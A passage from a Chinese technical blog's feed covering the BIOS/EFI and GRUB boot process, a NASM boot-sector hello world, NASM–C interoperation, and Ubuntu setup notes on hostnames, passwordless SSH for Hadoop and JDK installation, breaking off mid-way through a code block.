<p>其中stage1.5或是stage2便属于阶段2引导的过程了，stage2过程也是作为GRUB<br>kernel的核心代码出现。Stage1.5过程（对于GRUB而言存在stage1.5，GRUB2则不存在）的功能很单一，主要就是为了引导stage2过程服务。由于stage2过程的代码存放在文件系统下的boot分区目录中，因此stage1.5过程就是需要提供一个文件系统的环境，而该文件系统环境需要保证系统可以找到stage2过程的文件，那么stage1.5阶段提供的文件系统需要是boot文件系统所对应的，这个在执行grub<br>install过程中就已经确定了。stage2过程中，主要会把系统切换到保护模式，设置好C运行时环境，找到config文件（事实上就是menulist文件），如果没有找到就执行一个shell，等待用户的执行。然后的工作就变成了输入命令-&gt;解析命令-&gt;执行命令的循环中。当然该阶段引导的最终状态就是执行boot命令，将内核和initrd镜像加载进入内存中，进而将控制权转交给内核。</p>
<h4 id="四、第四阶段：操作系统"><a href="#四、第四阶段：操作系统" class="headerlink" title="四、第四阶段：操作系统"></a>四、第四阶段：操作系统</h4><p>控制权转交给操作系统后，操作系统的内核首先被载入内存。</p>
<p>以Linux系统为例，先载入&#x2F;boot目录下面的kernel。内核加载成功后，第一个运行的程序是&#x2F;sbin&#x2F;init。它根据配置文件（Debian系统是&#x2F;etc&#x2F;initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。</p>
<p>然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行&#x2F;bin&#x2F;login程序，跳出登录界面，等待用户输入用户名和密码。</p>
<p>至此，全部启动过程完成。</p>
<hr>
<p>\</p>
<h4 id="BIOS启动细节："><a href="#BIOS启动细节：" class="headerlink" title="BIOS启动细节："></a>BIOS启动细节：</h4><p>a)<br>按下电源开关，电源就开始向主板和其它设备供电；当芯片组检测到电源已经开始稳定供电了(当然从不稳定到稳定的过程只是一瞬间的事情)，它便撤去RESET信号(如果是手工按下计算机面板上的Reset按钮来重启机器，那么松开该按钮时芯片组就会撤去RESET信号)；CPU马上就从地址FFFF:0000H<br>处开始执行指令，放在这里的只是一条跳转指令，跳到系统BIOS中真正的启动代码处。</p>
<p>b) 系统BIOS的启动代码首先进行POST(Power－On Self<br>Test，加电后自检)。POST的主要检测系统中一些关键设备是否存在和能否正常工作，例如内存和显卡等设备；由于POST是最早进行的检测过程，此时显卡还没有初始化，如果系统BIOS在进行POST的过程中发现了一些致命错误，例如没有找到内存或者内存有问题(此时只会检查640K常规内存)，那么系统BIOS就会直接控制喇叭发声来报告错误，声音的长短和次数代表了错误的类型；在正常情况下，POST过程进行得非常快，几乎无法感觉到它的存在。POST结束之后就会调用其它代码来进行更完整的硬件检测。</p>
<p>c)<br>接下来系统BIOS将查找显卡的BIOS。前面说过，存放显卡BIOS的ROM芯片的起始地址通常设在C0000H处，系统BIOS在这个地方找到显卡BIOS之后就调用它的初始化代码，由显卡BIOS来初始化显卡。此时多数显卡都会在屏幕上显示出一些初始化信息，介绍生产厂商、图形芯片类型等内容，不过这个画面几乎是一闪而过。系统BIOS接着会查找其它设备的BIOS程序，找到之后同样要调用这些BIOS内部的初始化代码来初始化相关的设备。</p>
<p>d)<br>查找完所有其它设备的BIOS之后，系统BIOS将显示出它自己的启动画面，其中包括有系统BIOS的类型、序列号和版本号等内容。</p>
<p>e)<br>接着系统BIOS将检测和显示CPU的类型和工作频率，测试所有的RAM，并同时在屏幕上显示内存测试的进度。可以在CMOS设置中自行决定使用简单耗时少或者详细耗时多的测试方式。</p>
<p>f)<br>内存测试通过之后，系统BIOS将开始检测系统中安装的一些标准硬件设备，包括硬盘、CD-ROM、串口、并口和软驱等设备，另外绝大多数较新版本的系统BIOS在这一过程中还要自动检测和设置内存的定时参数、硬盘参数和访问模式等。</p>
<p>g)<br>标准设备检测完毕后，系统BIOS内部支持即插即用的代码将开始检测和配置系统中安装的即插即用设备。每找到一个设备之后，系统BIOS都会在屏幕上显示出设备的名称和型号等信息，同时为该设备分配中断、DMA通道和I&#x2F;O端口等资源。</p>
<p>h)<br>到这一步为止，所有硬件都已经检测配置完毕了，多数系统BIOS会重新清屏并在屏幕上方显示出一个表格，其中概略地列出了系统中安装的各种标准硬件设备，以及它们使用的资源和一些相关工作参数。</p>
<p>i) 接下来系统BIOS将更新ESCD(Extended System Configuration<br>Data，扩展系统配置数据)。ESCD是系统BIOS用来与操作系统交换硬件配置信息的一种手段，这些数据被存放在CMOS(一小块特殊的RAM，由主板上的电池来供电)之中。通常ESCD数据只在系统硬件配置发生改变后才会更新，所以不是每次启动机器时都能够看到”Update<br>ESCD…<br>Success”这样的信息。不过，某些主板的系统BIOS在保存ESCD数据时使用了与Windows<br>9x不相同的数据格式，于是Windows<br>9x在它自己的启动过程中会把ESCD数据修改成自己的格式。但在下一次启动机器时，即使硬件配置没有发生改变，系统BIOS也会把ESCD的数据格式改回来。如此循环，将会导致在每次启动机器时，系统BIOS都要更新一遍ESCD，这就是为什么有些机器在每次启动时都会显示出相关信息的原因。</p>
<p>j)<br>ESCD更新完毕后，系统BIOS的启动代码将进行它的最后一项工作：即根据用户指定的启动顺序从软盘、硬盘或光驱启动MBR。在这个过程中会按照启动顺序顺序比较其放置MBR的位置的结尾两位是否为0xAA55，通过这种方式判断从哪个引导设备进行引导。在确定之后，将该引导设备的MBR内容读入到0x7C00[1]的位置，并再次判断其最后两位，当检测正确之后，进行阶段1的引导。</p>
<h4 id="EFI启动细节"><a href="#EFI启动细节" class="headerlink" title="EFI启动细节"></a>EFI启动细节</h4><p>与传统MBR相比，GPT采用了不同的分区方式。</p>
<p>对于传统MBR，其结构主要如下：</p>
<p><img src="/images/mkos/2013-02-17-4.png" alt="BIOS Graph" title="BIOS Graph"></p>
<p>上图即对上文中所述的很形象的说明，在图中看到MBR被分成三个部分，分别是：Bootloader、分别表以及Magic<br>Number。其中Bootloader部分为stage1中被执行的起始部分。</p>
<p>相反，对于EFI系统中所采用的GPT分区方式，则采用了不同于MBR分区方式的形式，从下图中可以发现：</p>
<p><img src="/images/mkos/2013-02-17-5.png" alt="EFI Graph" title="EFI Graph"></p>
<p>如上图所示，GPT分区表主要包括：保护MBR、首要GPT头、首要GPT、备用GPT、备用GPT头和磁盘数据区。保护MBR与正常的MBR区别不大，主要是分区表上的不同，在保护MBR中只要一个表示为0xEE的分区，以此来表示这块硬盘使用GPT分区表。首要GPT头包含了众多信息，具体内容如下：</p>
<p><img src="/images/mkos/2013-02-17-6.png" alt="EFI Table" title="EFI Table"></p>
<p>分区表头定义了硬盘的可用空间以及组成分区表的项的大小和数量。分区表头还记录了这块硬盘的GUID，记录了分区表头本身的位置和大小（位置总是在LBA1）以及备份分区表头和分区表的位置和大小（在硬盘的最后）。它还存储着它本身和分区表的CRC32校验。固件、引导程序和操作系统在启动时可以根据这个校验值来判断分区表是否有错误，如果出错了，可以使用软件从硬盘最后的备份GPT分区表恢复整个分区表，如果备份GPT也校验错误，那么磁盘将不可用，系统拒绝启动。</p>
<p>接下来主要是128个分区表项，GPT分区表使用简单而直接的方式表示分区。一个分区表项的前16字节是分区类型GUID。例如，EFI系统分区的GUID类型是{C12A7328-F81F-11D2-BA4B-00A0C93EC93B}<br>。接下来的16字节是该分区的唯一的GUID（这个指的是该分区本身，而之前的GUID指的是该分区的类型）。在接下来是分区其实和末尾的64位LBA编号，以及分区的名字和属性。具体结构如下表：</p>
<p><img src="/images/mkos/2013-02-17-7.png" alt="EFI Table2" title="EFI Table2"></p>
<h4 id="MBR引导"><a href="#MBR引导" class="headerlink" title="MBR引导"></a>MBR引导</h4><p>接下来开始真正的引导过程了，主要说明GRUP的引导。总体上GRUB更像是一个mini<br>os，只不过这个mini<br>os的作用只是加载其他的操作系统，在GRUB中包括stage1、stage1.5（可选）和stage2，其中stage1和stage1.5属于boot<br>loader，stage2属于mini<br>os的内核部分。GRUB中stage1过程主要位于MBR的前446字节中（对于支持GPT分区的磁盘，同样有最开始的512字节作为保护MBR，保护MBR与正常的MBR区别不大，主要是分区表上的不同，在保护MBR中只要一个表示为0xEE的分区，以此来表示这块硬盘使用GPT分区表，不能识别GPT硬盘的操作系统通常会识别出一个未知类型的分区，并且拒绝对硬盘进行操作），之后的64字节为硬盘的分区表，最后两个字节为MBR结束标志位（0xAA55）。</p>
<p>stage1部分占用了446字节，其代码文件是源码目录下stage1&#x2F;stage1.S文件，汇编后生成一个512字节的boot.img，被写在硬盘的0面0道1扇区中，作为硬盘的MBR。stage1的工作很简单，就是加载0面0道2扇区上的512字节到0×8000，然后跳转到0×8000执行。</p>
<p>在0面0道2扇区上的512字节内容为<code>stage1/start.S</code>文件汇编后生成。该扇区上的内容的作用是加载stage1.5或是stage2过程，并将控制权转交。</p>
<h4 id="Grub引导"><a href="#Grub引导" class="headerlink" title="Grub引导"></a>Grub引导</h4><p>在start过程将控制权转交后，接下来就是GRUB的核心过程了。该过程之所以区分stage1.5和stage2，主要原因是GRUB和GRUB2的区别。在GRUB2中，将stage1.5过程集成到了stage2的过程中，所以stage1.5过程仅仅是针对GRUB的。下面将会分别介绍两种GRUB版本的两种过程。</p>
<p>4.1 GRUB中stage1.5过程</p>
<p>Stage1.5过程很无辜，它的作用很单一，但是非常关键。它的主要功用就是构造一个boot分区系统对应的文件系统，这样可以通过文件系统的路径（&#x2F;boot&#x2F;grub&#x2F;）寻找stage2过程需要的core.img，进而加载到内存中开始执行。</p>
<p>Stage1.5存在于0面0道3扇区开始的地方，并一直延续十几k字节的区域，具体的大小与相应的文件系统的大小有关（文中涉及到了0面0道1-3+x扇区，这部分扇区为保留扇区，BIOS不会放置任何数据。正因为如此如果转换到GPT分区形式，系统将不能被正确引导，如上文所示，MBR后面的扇区都被其他内容所占据）。Stage1.5过程被构建成多种不同类型，但是功能类似，下面简单介绍一下基本的stage1.5过程的文件系统。e2fs_stage1_5（针对ext2fs，可引导ext2和ext3文件系统）、fat_stage1_5（针对fat文件系统，可引导fat32和fat16）、ffs_stage1_5、jfs_stage1_5、minix_stage1_5、reiserfs_stage1_5、vstafs_stage1_5和xfs_stage1_5，这些文件被称为stage1.5过程，这些文件每个至少都在11k以上。除此之外还有两个比较特殊的文件，分别为nbgrub和pxegrub，这两个文件主要是在网络引导时使用，只是格式不同而已，他们很类似与stage2，只是需要建立网络来获取配置文件。</p>
<p>由于stage1.5过程中会涉及到多个文件系统对应的文件，因此本文中主要以ext2fs为例进行说明，其他文件系统与此类似，可以同样进行分析理解。</p>
<p>对于ext2fs文件系统，用于生成该文件系统的stage1.5过程文件（e2fs_stage1_5）的代码为<code>stage2/fsys_ext2fs.c</code>文件。</p>
<p>在<code>stage2/filesys.h</code>文件中定义了每个文件系统对外的接口，用于上层调用，作为stage2过程寻找核心代码使用，文件系统一般被定义的接口主要就是三个函数，分别是mount、read和dir函数。对应ext2fs，其定义的函数为：</p>
<pre><code>#ifdef FSYS_EXT2FS
#define FSYS_EXT2FS_NUM 1
int ext2fs_mount (void);
int ext2fs_read (char *buf, int len);
int ext2fs_dir (char *dirname);
#else
#define FSYS_EXT2FS_NUM 0
#endif
</code></pre>
<p>针对ext2fs有如上的函数名称，每个函数将具体在<code>stage2/fsys_ext2fs.c</code>文件中被定义，这里面没有包含任何的写的过程，对于bootloader而言仅仅读就可以完成任务了，没必要对其系统进行写操作。其中ext2fs_mount函数用于检查文件系统类型，并将superblock读入到内存中；ext2fs_read函数和ext2fs_dir函数用于对文件系统具体的操作。在<code>stage2/fsys_ext2fs.c</code>文件中除了需要对这三个函数的定义之外，还需要文件系统的属性的数据结构（superblock、inode和group结构，这些结构最初被定义在<code>include/linux/ext2_fs.h</code>文件中），通过这些数据结构描述一个文件系统。</p>
<p>如果读者有兴趣可以试着创建新的文件系统的支持，可以参照目前存在的一些文件系统的模板（实例）编写。</p>
<p>4.2 GRUB中stage2过程</p>
<p>GRUB中的核心过程也就是stage2过程了，该过程主要是在文件系统建立以后选择合适的操作系统进行加载并转交控制权，达到最后引导操作系统的目标。由于GRUB属于multi<br>boot<br>loader，因此在引导的时候要进行选择，选择哪种操作系统来运行。在GRUB内部主要包括两种方式，首先是从menu.list中读取显示到屏幕让用户选择，其次是通过grub-shell中定义的命令手动进行启动。本文将在后面介绍这两种方式如何运行，接下来先介绍一下stage2的具体的执行过程。</p>
<p>在上面一节中介绍过，stage1.5过程中将boot分区的文件系统加载了，之后又做了一件事情，就是将控制权转交给stage2，而stage2入口的地方就是<code>stage2/asm.S</code>文件。<code>Stage2/asm.S</code>文件属于汇编代码，主要作用是初始化C语言的运行环境，为下面执行C语言的函数做好准备，在准备好之后，将执行init_bios_info(<code>stage2/common.c</code>)函数。init_bios_info函数的作用是执行一些底层的函数，然后跳转到cmain执行，cmain函数位于<code>stage2/stage2.c</code>文件中。cmain函数内部进行一个死循环，在循环内部首先加载配置文件，显示给用户，在这同时循环一个内层循环，在内层循环中，获取配置文件中的命令，并解析执行。过程中如果没有可用的配置文件，那么进入命令行模式（enter_cmdline函数），如果找到可用的menu，那么开始执行menu的对应的内容（run_menu函数）。</p>
<p>对于enter_cmdline（<code>stage2/stage2.c</code>）函数，将调用find_command（<code>stage2/cmdline.c</code>），进而执行相应命令的函数。</p>
<p>对于run_menu（<code>stage2/stage2.c</code>）函数，将调用<code>stage2/cmdline.c</code>文件中的run_script函数，进而调用find_command，执行相应命令的函数。</p>
<p>这两种方式虽然经过了不同的过程，对用户输入的行为进行分析和处理，最终调用的函数为find_command，在该函数中顺序循环比较”输入”的命令是否与系统内部定义的相同，如果相同转到执行该函数。在这个比较的过程中包含了一个全局的数据结构为struct<br>builtin（<code>stage2/shared.h</code>），由该数据结构组成了一个table类型（<code>stage2/builtins.c</code>），将命令与相对应的builtin结构对应一起并进行串联。下面描述一下builtin结构的定义：</p>
<pre><code>struct builtin &#123;
  /* 命令名称，重要，是搜索命令时的依据*/
  char *name;
  /* 命令函数，重要，是搜索匹配后调用的函数*/
  int (*func) (char *, int);
  /* 功能标示，一般未用到. */
  int flags;
  /* 简短帮助信息*/
  char *short_doc;
  /* 完整帮助信息*/
  char *long_doc;
&#125;;

struct builtin *builtin_table[]；
</code></pre>
<p>有兴趣的读者可以对上面的内容进行扩展，形成自己的命令，主要在<code>stage2/builtins.c</code>文件中按照预定的格式更新，并添加到builtin_table中即可。</p>
<p>在上面打开配置文件的过程中，主要是通过一些文件操作函数（被定义在<code>stage2/disk_io.c</code>中）完成。这些文件操作函数主要包括：grub_open、grub_read、grub_seek和grub_close等，这些函数属于grub对外的上层接口，具体的函数内部将调用前文中提到的boot分区对应的文件系统的相应的函数完成，这个过程主要是通过回调函数来完成。该过程整体思路类似于面向对象过程，通过对象操作具体的函数。</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>制作最小操作系统hello world</title>
    <url>/blog/os/mkos/helloos/</url>
    <content><![CDATA[<p>知识点：</p>
<p>程序的起始地址：0x7c00，因为0x00007c00-0x00007dff规定为启动区内容的装载地址</p>
<p>启动扇区的最后两个字节：0x55aa，盘的第一个扇区的最后为0x55aa,表明第一个扇区为启动扇区。</p>
<p>其它的看汇编程序，注释很详细。</p>
<p>程序来源：《自己动手写操作系统》</p>
<pre><code>;
;一个简单的软盘启动程序，启动后输出hello world。
;可以用nasm编译。
;用虚拟机的软驱可以加载运行。
;
    org 07c00h      ; 告诉编译器程序加载到7c00处
    mov ax, cs
    mov ds, ax
    mov es, ax
    call    print_string    ; 调用显示字符串例程
    jmp $       ; 无限循环
print_string:
    mov ax, msg
    mov bp, ax      ; ES:BP = 串地址
    mov cx, 16      ; CX = 串长度
    mov ax, 01301h  ; AH = 13,  AL = 01h
    mov bx, 000ch   ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
    mov dl, 0
    int 10h     ; 10h 号中断
    ret
msg:    db  &quot;Hello world!&quot;

; 填充剩下的空间，使生成的二进制代码恰好为512字节
times   510-($-$$) db 0     
dw  0xaa55          ; 结束标志
</code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>NASM和C互相调用对方的函数</title>
    <url>/blog/os/mkos/nasmcfunc/</url>
    <content><![CDATA[<h2 id="NASM和C互相调用对方的函数"><a href="#NASM和C互相调用对方的函数" class="headerlink" title="NASM和C互相调用对方的函数"></a>NASM和C互相调用对方的函数</h2><p><strong>hello.asm</strong></p>
<pre><code>extern print_helloworld

[section .text]
global print_two_hello_world
print_two_hello_world:  
    call print_helloworld
    call print_helloworld
</code></pre>
<p><strong>main.c</strong></p>
<pre><code>#include &quot;stdio.h&quot;

extern void print_two_hello_world();

char *strhello = &quot;Hello,world!\n&quot;;

void print_helloworld ()
&#123;
        printf (&quot;%s&quot;,strhello);
&#125;

int  main ()
&#123;
        print_two_hello_world();
        return 0;
&#125;
</code></pre>
<p>编译方法：</p>
<p>nasm -f elf hello.asm -o hello.o</p>
<p>gcc -o main main.c hello.o</p>
<p>如果机器是64位的，nasm要用elf64编译。</p>
<p>nasm -f elf64 hello.asm -o hello.o</p>
<p>会创建一个叫main的可执行文件，打印出两行hello, world!</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>NASM和C互相调用对方的变量</title>
    <url>/blog/os/mkos/nasmcvar/</url>
    <content><![CDATA[<h2 id="NASM和C互相调用对方的变量"><a href="#NASM和C互相调用对方的变量" class="headerlink" title="NASM和C互相调用对方的变量"></a>NASM和C互相调用对方的变量</h2><p><strong>hello.asm</strong></p>
<pre><code>global string
extern strhello
[section .data]
string:
    db &#39;I am Chinese.&#39;,0x0A,0x0
[section .text]
    global print_hello
    global cpy_mem
print_hello:    
    mov edx, 13
    mov ecx,[strhello]
    mov ebx,1
    mov eax,4
    int 0x80
</code></pre>
<p><strong>main.c</strong></p>
<pre><code>#include &quot;stdio.h&quot;
#include &quot;string.h&quot;
extern char *string;
extern void print_hello();
extern cpy_mem (void *dest, int len);
char *strhello = &quot;Hello,world!\n&quot;;
char *str = NULL;
int
main ()
&#123;
        printf (&quot;%x\n&quot;,&amp;string);
        str = &amp;string;
        printf (&quot;%s&quot;, str);
       
        print_hello ();
        return 0;
&#125;
</code></pre>
<p>编译方法：</p>
<p>nasm -f elf hello.asm -o hello.o</p>
<p>gcc -o main main.c hello.o</p>
<p>如果机器是64位的，nasm要用elf64编译。</p>
<p>nasm -f elf64 hello.asm -o hello.o</p>
<p>会创建一个叫main的可执行文件。</p>
<p><strong>注意：</strong></p>
<p>1.在C语言中定义了一个strhello的字符串变量，在C语言中strhello表示的是字符串的首地址，比如字符串的地址是0xa00001，而strhello是个指针即4字节其地址为0xb00001，<br>在C语言中strhello表示的值是 0xa00001<br>字符串的首地址，但到了NASM中则表示的 strhello变量的首地址了<br>0xb00001，所以<code>mov ecx,[strhello]</code>代码中加了中括号表示是内容，这一点一定要注意，否则会出错！！</p>
<p>2.第二点要注意的是，在NASM中定义了一个字符串string ，<br>在C语言中导入的话，就是表示字符串的首地址，因此要引用该字符串一定要取其地址，不要直接转为(char*)类型直接用，否则出错，这是因为直接转的话，就将字符串的前4个字节转成了字符串指针，但该指针是不确定会出现段错误！</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu如何查看修改主机名</title>
    <url>/blog/os/linux/hostname/</url>
    <content><![CDATA[<h3 id="1、查看主机名"><a href="#1、查看主机名" class="headerlink" title="1、查看主机名"></a>1、查看主机名</h3><p>在Ubuntu系统中，快速查看主机名有多种方法：</p>
<p>其一，打开一个GNOME终端窗口，在命令提示符中可以看到主机名，主机名通常位于”@”符号后；</p>
<p>其二，在终端窗口中输入命令：hostname或uname<br>–n，均可以查看到当前主机的主机名。</p>
<h3 id="2、临时修改主机名"><a href="#2、临时修改主机名" class="headerlink" title="2、临时修改主机名"></a>2、临时修改主机名</h3><p>命令行下运行命令：”hostname 新主机名”</p>
<p>其中”新主机名”可以用任何合法字符串来表示。不过采用这种方式，新主机名并不保存在系统中，重启系统后主机名将恢复为原先的主机名称。</p>
<p>例子：hostname ubuntu-temp</p>
<p>这样主机名字就临时被修改为ubuntu-temp，但是终端下不会立即显示生效后的主机名，重开一个终端窗口(通过ssh连接的终端需要重新连接才可以);</p>
<h3 id="3、永久修改主机名"><a href="#3、永久修改主机名" class="headerlink" title="3、永久修改主机名"></a>3、永久修改主机名</h3><p>在Ubuntu系统中永久修改主机名也比较简单。主机名存放在&#x2F;etc&#x2F;hostname文件中，修改主机名时，编辑hostname文件，在文件中输入新的主机名并保存该文件即可。重启系统后，参照上面介绍的快速查看主机名的办法来确认主机名有没有修改成功。</p>
<p>值的指出的是，在其它Linux发行版中，并非都存在&#x2F;etc&#x2F;hostname文件。如Fedora发行版将主机名存放在&#x2F;etc&#x2F;sysconfig&#x2F;network文件中。所以，修改主机名时应注意区分是哪种Linux发行版。</p>
<h3 id="3、-x2F-etc-x2F-hostname与-x2F-etc-x2F-hosts的区别"><a href="#3、-x2F-etc-x2F-hostname与-x2F-etc-x2F-hosts的区别" class="headerlink" title="3、&#x2F;etc&#x2F;hostname与&#x2F;etc&#x2F;hosts的区别"></a>3、&#x2F;etc&#x2F;hostname与&#x2F;etc&#x2F;hosts的区别</h3><p>&#x2F;etc&#x2F;hostname中存放的是主机名，hostname文件的一个例子：</p>
<p>pc-hadoop-1</p>
<p>&#x2F;etc&#x2F;hosts存放的是域名与ip的对应关系，域名与主机名没有任何关系，你可以为任何一个IP指定任意一个名字，hostname文件的一个例子：</p>
<p>127.0.0.1 localhost</p>
<p>127.0.1.1 pc-hadoop-1</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu Linux配制SSH免密码接入</title>
    <url>/blog/os/linux/sshmmmjr/</url>
    <content><![CDATA[<p>在学习hadoop过程中要配制SSH免密码接入，这里把配制过程和遇到的问题整理了一下。</p>
<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>可以通过<a href="/os/linux/ubuntu/cmd/scp.php">scp命令</a>在部署的linux间免密码传送文件。</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Ubuntu 14</p>
<h3 id="环境检查"><a href="#环境检查" class="headerlink" title="环境检查"></a>环境检查</h3><p>SSH客户端一般linux都会安装，但SSH<br>SERVER不一定安装，要先检查一下有没有安装。</p>
<p>测试ssh时使用ssh localhost 命令，出现错误提示connect to host localhost<br>port 22:Connection refused，说明可能没有安装SSH SERVER。</p>
<p>运行 ps -e | grep ssh，查看是否有sshd进程。</p>
<p>如果没有，说明server没启动，通过 &#x2F;etc&#x2F;init.d&#x2F;ssh -start<br>启动server进程，如果提示ssh不存在那么就是没安装server。</p>
<p>通过 sudo apt-get install openssh-server命令安装。</p>
<h3 id="生成SSH密钥对"><a href="#生成SSH密钥对" class="headerlink" title="生成SSH密钥对"></a>生成SSH密钥对</h3><p>执行ssh-keygen -t rsa命令，生成ssh所用的公钥和私钥。</p>
<p>生成两个文件：id_rsa和id_rsa.pub。</p>
<p>生成文件所在位置：&#x2F;home&#x2F;&#x2F;.ssh，这是一个隐藏目录，直接ls是看不到的，可以cd进去查看。</p>
<p>每个linux用户都有一个自己的文件夹，为&#x2F;home&#x2F;，其中user为文件名，所以配制的ssh只是针对当前登录用户的。</p>
<h3 id="分发SSH公钥"><a href="#分发SSH公钥" class="headerlink" title="分发SSH公钥"></a>分发SSH公钥</h3><p>在每个linux的.ssh文件夹里创建文件：authorized_keys，里面为刚才生成的每个linux用户的公钥。</p>
<p>我的做法是用gedit创建文件：</p>
<p>hadoop@hadoop-1:~$ gedit .ssh&#x2F;authorized_keys</p>
<p>用gedit打开t每个linux的公钥文件：</p>
<p>hadoop@hadoop-1:~$ gedit .ssh&#x2F;id_rsa.pub</p>
<p>复制好一份，再复制到其它linux上。因为不会用vi什么的，linux一般都是用vi做这事的。</p>
<p>下面是做好的文件：</p>
<pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9cOV9golV2keSnmFrjeUd1IZqWGYquYNWu8eZXVA/+fKpgSdMjxHI4yXSsNazTvTJ5Jzr/b1mDOTQXs9gkutsudM+jrGtwfcl2X63PauLspszEYqqFK7apQULCc85QGLUr9enqiRLarnFGtKvCpleJa5TRzC+pCAKBjsTy9aKuVsYjq+/5F/oemI9uI5qGXrg9lfgPubeFPZ2cZgY6bquugEQL+YYb4VHUNMYMuAWyMAau4IDpvKcBLHBbSbGPqe8xnllIC512eMOJ7+057Gq9ZC4PNkCfZ86QL58WZUwPnpuywh634ukTjnKbsOLOXvGCHH1O7y5BDCWv8Ie7zKp hadoop@hadoop-1

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUuVG79a2WYtYU+b1BXvXgBQ7Bp7SkOtFGlNEpM4PZJgcZyGm9xIuFqRUQMkmHr/TE+FFNAJlX3y8ryyDQTnOz0RpbEsrsjYLquao70Nx5OgqjpyFLWgnkuh/wcCSq37lQtDMmYWOLgbTIob5BSV1CCFxKk2kCjR89Vc+K5Nuypy9Lv8SnuPCIOt5AoZQX2oRI/KBtHasJ2ekFDfoOdTc2VVXhWSxqKC92V2+mk6GJM0L9FOWv4zNTO7LpDhLKGh4ezECOieQ+v1KrdV6+9wFBQKZRvOM8T7/M6t27YzCcrz1hzM4lGaKEvtv11RBKs+bcq946cQjZV0JEMqfhzkEf hadoop@hadoop-1

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVyHyIusaehysmaCD5Tgt5oz82x5jFkOMnIsR7V03MoBr7200/qD6bPL7QiO17DNqTp6UhuyBtMrbYYWpgQoJlIfnPzE99dvCoLFy8lNwgS8m2RxARJU+XoP+1NsfgwYm2QkuLdgdSvQXcAfxp42ZZPv74KTUZy3wqR65KDkdX7qrA2/OvpU1rDVa02XRU5FH5N1MWFWIUeMmXMUw0JBOwF0kfj2/L4Rcp/vwJA9Jw9yUNS4OOhDKz1Hmd6d0BK+JMaihv6+mKmKtoaurdc21NOXse9OfJnIjHiLCfy/PsuOiLNxtciI6VdbPp/9n2p5QPd9ui3KgwbIA77vQz1ZiV hadoop@hadoop-1
</code></pre>
<h3 id="配制主机名和hosts文件"><a href="#配制主机名和hosts文件" class="headerlink" title="配制主机名和hosts文件"></a>配制主机名和hosts文件</h3><p>文件里的最后的hadoop@hadoop-1是”用户@主机名”，因为我是用虚拟机克隆了三个，所以是一样的。不过主机名要改成不一样的，否则用scp时指定主机名就冲突了。注意不是改公钥文件里的内容。</p>
<p>修改主机名参考：<a href="/os/linux/ubuntu/hostname.php">Ubuntu如何查看修改主机名</a></p>
<p>修改主机名用：sudo gedit &#x2F;etc&#x2F;hostname</p>
<p>修改hosts文件用：sudo gedit &#x2F;etc&#x2F;hosts</p>
<p>改后的hosts文件：</p>
<pre><code>127.0.0.1 localhost
127.0.1.1   ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.163.136 hadoop-1
192.168.163.137 hadoop-2
192.168.163.138 hadoop-3
</code></pre>
<p>重启各linux后相互就可以通过主机名访问了。</p>
<h3 id="第一次连接的问题"><a href="#第一次连接的问题" class="headerlink" title="第一次连接的问题"></a>第一次连接的问题</h3><p>都配制好了应该就可以用scp传送文件了，不过第一次会提示公钥没有记录在known_hosts文件里。要输入一次yes,以后再连接同一台机器就不会提示了。</p>
<pre><code>hadoop@hadoop-3:~$ scp ./scptest hadoop-3:/home/hadoop/test
The authenticity of host &#39;hadoop-3 (192.168.163.138)&#39; can&#39;t be established.
ECDSA key fingerprint is 2a:1f:cf:e0:94:31:55:95:da:53:e8:27:a2:92:37:bb.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;hadoop-3,192.168.163.138&#39; (ECDSA) to the list of known hosts.
scptest                                       100%    0     0.0KB/s   00:00    
hadoop@hadoop-3:~$ 
</code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】如何用tar.gz包安装JDK</title>
    <url>/blog/os/linux/jdktar/</url>
    <content><![CDATA[<h2 id="下载jdk安装包"><a href="#下载jdk安装包" class="headerlink" title="下载jdk安装包"></a>下载jdk安装包</h2><p>jdk-8u45-linux-x64.tar.gz</p>
<p><a href="http://pan.baidu.com/s/1hq8kI4O">http://pan.baidu.com/s/1hq8kI4O</a></p>
<p>qgeu</p>
<h2 id="解压安装包"><a href="#解压安装包" class="headerlink" title="解压安装包"></a>解压安装包</h2><p>sudo <a href="/os/linux/cmd/tar.php">tar</a> -zxvf jdk-8u45-linux-x64.tar.gz -C<br>&#x2F;opt&#x2F;java&#x2F;</p>
<p>这会将安装包解压到&#x2F;opt&#x2F;java&#x2F;目录下。</p>
<h2 id="配置classpath"><a href="#配置classpath" class="headerlink" title="配置classpath"></a>配置classpath</h2><p>修改所有用户的环境变量：</p>
<p>$ sudo vi &#x2F;etc&#x2F;profile 或者 $sudo gedit &#x2F;etc&#x2F;profile</p>
<p>在文件最后添加</p>
<pre><code>#set java environment
export JAVA_HOME=/opt/java/jdk1.8.0_45
export PATH=$PATH:$JAVA_HOME/bin
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
